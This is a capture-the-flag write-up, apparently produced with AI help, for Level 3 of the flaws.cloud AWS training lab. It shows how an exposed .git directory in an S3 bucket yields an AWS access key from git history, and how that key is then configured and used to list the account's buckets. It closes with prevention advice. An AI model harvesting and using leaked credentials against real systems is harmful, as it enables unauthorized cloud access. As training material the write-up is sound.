# Level 3 Writeup - Leaked AWS Keys in Git History

**Completed:** December 2, 2025  
**Assisted by:** Claude (AI pair programming assistant)

---

## Challenge Overview

Level 3 introduces the concept of **leaked credentials in version control**. The challenge hints: "Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are."

## Approach

### Step 1: Listing the Bucket

Using authenticated AWS CLI access (from Level 2), we listed the bucket contents:

```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```

**Result:**
```
PRE .git/
authenticated_users.png
hint1.html
hint2.html
hint3.html
hint4.html
index.html
robots.txt
```

The `.git/` directory immediately stood out - a git repository exposed in a web-accessible S3 bucket!

### Step 2: Exploring the Git Directory

We explored the git structure remotely:

```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/
```

Then viewed the commit history by streaming the logs/HEAD file:

```bash
aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD -
```

**Result:**
```
0000000... f52ec03b... commit (initial): first commit
f52ec03b... b64c8dcf... commit: Oops, accidentally added something I shouldn't have
```

The commit message "Oops, accidentally added something I shouldn't have" was a clear indicator that sensitive data was committed and then removed.

### Step 3: Downloading and Analyzing the Git Repository

We downloaded the entire `.git` directory for local analysis:

```bash
mkdir -p /workspace/level3
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git /workspace/level3/.git
```

Then renamed it to avoid conflicts with our own repository:

```bash
mv /workspace/level3/.git /workspace/level3/git-exposed
```

### Step 4: Examining the First Commit

Using git with the `--git-dir` flag to point at our renamed directory:

```bash
git --git-dir=git-exposed show f52ec03
```

**Result:** Found `access_keys.txt` in the first commit:
```
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key [REDACTED - find this yourself!]
```

### Step 5: Using the Leaked Credentials

We configured the AWS CLI with the leaked credentials:

```bash
aws configure set aws_access_key_id AKIAJ366LIPB4IJKT7SA
aws configure set aws_secret_access_key [REDACTED - find this yourself!]
aws configure set region us-west-2
```

Verified the identity:

```bash
aws sts get-caller-identity
```

**Result:**
```json
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

### Step 6: Enumerating Buckets

Listed all S3 buckets accessible to the "backup" user:

```bash
aws s3 ls
```

**Result:**
```
2024-11-12 03:09:06 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2024-11-12 16:05:22 config-bucket-975426262029
2024-11-09 20:33:01 flaws-logs
2025-11-10 20:11:00 flaws.cloud
2025-11-10 20:11:00 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2025-11-10 20:11:40 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2025-11-10 20:11:49 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2025-11-10 20:10:35 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2025-11-10 20:12:05 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2025-11-10 20:12:15 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

This revealed all the level URLs and other internal buckets!

## Tools Used

| Tool | Purpose |
|------|---------|
| `aws s3 ls` | Listing bucket contents and discovering .git directory |
| `aws s3 cp ... -` | Streaming file contents to stdout without saving to disk |
| `aws s3 sync` | Downloading the entire .git directory |
| `git --git-dir` | Examining git history from a non-standard location |
| `aws configure` | Setting up credentials for the leaked keys |
| `aws sts get-caller-identity` | Verifying which identity the credentials belong to |

## Security Concepts

### Inspecting Files Safely

Before downloading potentially malicious content, we discussed safe inspection methods:

| Method | Risk Level | Description |
|--------|------------|-------------|
| `aws s3 ls` | Minimal | List without downloading |
| `aws s3 cp ... -` | Low | Stream to stdout, don't execute |
| `aws s3api head-object` | Minimal | Metadata only |
| Isolated VM/container | Very Low | Full isolation |

### Understanding ARNs

The ARN `arn:aws:iam::975426262029:user/backup` breaks down as:

| Component | Value | Meaning |
|-----------|-------|---------|
| `arn` | Prefix | Amazon Resource Name identifier |
| `aws` | Partition | Standard AWS (vs aws-cn, aws-us-gov) |
| `iam` | Service | Identity and Access Management |
| *(empty)* | Region | IAM is global, no region needed |
| `975426262029` | Account | The AWS account ID |
| `user/backup` | Resource | IAM user named "backup" |

## Vulnerability Explained

**The Misconfiguration:** AWS credentials were committed to a git repository, then "removed" in a subsequent commit. However, git preserves all history, so the credentials remained accessible.

**Why This Happens:**
1. Developer accidentally commits credentials
2. Developer notices and removes them in the next commit
3. Developer believes the credentials are now safe
4. Git history still contains the original commit with credentials

**Real-World Impact:**
- Leaked credentials often have excessive permissions
- Service accounts like "backup" frequently have broad access
- Credentials in git history persist even after force-pushing
- Public repositories are constantly scanned by automated tools

**How to Prevent This:**

| Prevention | Description |
|------------|-------------|
| **Pre-commit hooks** | Use tools like `git-secrets` or `trufflehog` to block commits containing secrets |
| **Environment variables** | Never hardcode credentials; use environment variables or secret managers |
| **AWS Secrets Manager** | Store credentials in dedicated secret management services |
| **IAM Roles** | Use IAM roles instead of long-term access keys where possible |
| **Credential rotation** | Regularly rotate credentials, especially after any potential exposure |
| **git-filter-branch** | If credentials are committed, rewrite history AND rotate the credentials |
| **.gitignore** | Add credential files to .gitignore before they're ever committed |

**Critical Point:** Simply removing credentials from a repository is NOT sufficient. You must:
1. Rewrite git history to remove the commits entirely
2. **AND** rotate/revoke the exposed credentials immediately

## Key Takeaways

1. **Git never forgets** - Deleted files remain in git history forever
2. **"Removing" secrets doesn't work** - You must rotate credentials after any exposure
3. **Exposed .git directories are goldmines** - Always check for `.git/` in web applications
4. **Service accounts are high-value targets** - They often have excessive permissions
5. **Use `aws sts get-caller-identity`** - Always verify what identity credentials belong to
6. **Stream before downloading** - Use `aws s3 cp ... -` to inspect files safely

## Progression

| Level | Vulnerability | Access Method |
|-------|--------------|---------------|
| 1 | S3 bucket open to Everyone | Anonymous (`--no-sign-request`) |
| 2 | S3 bucket open to Any Authenticated AWS User | Any AWS credentials |
| 3 | Leaked credentials in git history | Compromised credentials |

## Next Level

Level 4: `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`

